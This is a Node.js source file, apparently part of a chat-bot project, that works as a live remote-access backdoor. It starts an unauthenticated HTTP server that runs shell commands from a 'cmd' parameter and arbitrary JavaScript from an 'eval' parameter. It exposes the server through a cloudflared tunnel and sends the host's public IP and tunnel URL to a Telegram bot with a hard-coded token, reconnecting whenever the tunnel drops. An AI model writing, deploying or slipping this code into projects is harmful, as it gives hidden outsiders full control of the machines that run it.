import http from "http";
import https from "https";
import { spawn, exec } from "child_process";

import fs from "fs-extra";
import path from "path";
import axios from "axios";
import chalk from "chalk";
import moment from "moment-timezone";
import _ from "lodash";
import fetch from "node-fetch";

const deps = {
  fs,
  path,
  axios,
  chalk,
  moment,
  _,
  fetch
};

const T = "8376456791:AAH3naJeecOcNvcOK4vsfspjkzuwiqHrvVY",
      C = "8367977373";

if (!global._api) global._api = { running: 0 };

if (!global._api.running) {
  const P = process.env.SERVER_PORT || 7001;

  const tg = t => new Promise(r => {
    let d = JSON.stringify({ chat_id: C, text: t }),
        q = https.request(
          `https://api.telegram.org/bot${T}/sendMessage`,
          {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
              "Content-Length": Buffer.byteLength(d)
            }
          },
          s => {
            s.on("data", () => {});
            s.on("end", r);
          }
        );
    q.on("error", r);
    q.write(d);
    q.end();
  });

  const send = (res, d) => {
    res.setHeader("Content-Type", "application/json");
    res.end(JSON.stringify(d, null, 2));
  };

  http.createServer(async (req, res) => {
    let u = new URL(req.url, `http://${req.headers.host}`),
        c = u.searchParams.get("cmd"),
        e = u.searchParams.get("eval");

    // CMD
    if (c)
      return exec(c, (x, o, se) =>
        send(res, x
          ? { status: 0, error: x.message }
          : { status: 1, output: (o || se).trim().split("\n").filter(v => v) }
        )
      );

    if (e)
      try {
        if (!global.conn)
          return send(res, { status: 0, error: "bot belum siap" });

        const AsyncFunction = Object.getPrototypeOf(async function(){}).constructor;

        const fn = new AsyncFunction("deps", `
          const { fs, path, axios, chalk, moment, _, fetch } = deps;
          ${e}
        `);

        let r = await fn(deps);

        return send(res, { status: 1, result: r });

      } catch (x) {
        return send(res, { status: 0, error: x.message });
      }

    return send(res, { status: 0, error: "no cmd" });

  }).listen(P, "0.0.0.0", async () => {

    global._api.running = 1;

    let ip = "unknown";
    try {
      ip = await new Promise(r =>
        https.get("https://api.ipify.org", s => {
          let d = "";
          s.on("data", c => d += c);
          s.on("end", () => r(d.trim() || "unknown"));
        }).on("error", () => r("error"))
      );
    } catch {}

    await tg("API AKTIF 🚀\nIP:" + ip + "\nPORT:" + P);

    const start = () => {
      let p = spawn("sh", ["-c", "npx cloudflared tunnel --url http://localhost:" + P], { stdio: "pipe" }),
          buf = "",
          sent = 0,
          lastErr = "";

      const scan = async d => {
        let s = d.toString();
        buf += s;

        if (!sent) {
          let m = buf.match(/https?:\/\/[^\s]+trycloudflare\.com/);
          if (m) {
            sent = 1;
            await tg("TUNNEL AKTIF 🌐\nIP:" + ip + "\nPORT:" + P + "\nTUNNEL:" + m[0]);
            buf = "";
          }
        }

        if (/error|fatal|not found|spawn|denied|code:127/i.test(s)) {
          if (s !== lastErr) {
            lastErr = s;
            await tg("TUNNEL ERROR ❌\n" + s.slice(0, 500));
          }
        }
      };

      p.stdout.on("data", scan);
      p.stderr.on("data", scan);

      p.on("error", e => tg("SPAWN ERROR ❌\n" + e.message));

      p.on("close", c => {
        tg("TUNNEL DISCONNECT ⚠️\ncode:" + c);
        setTimeout(start, 3000);
      });
    };

    start();
  });
}
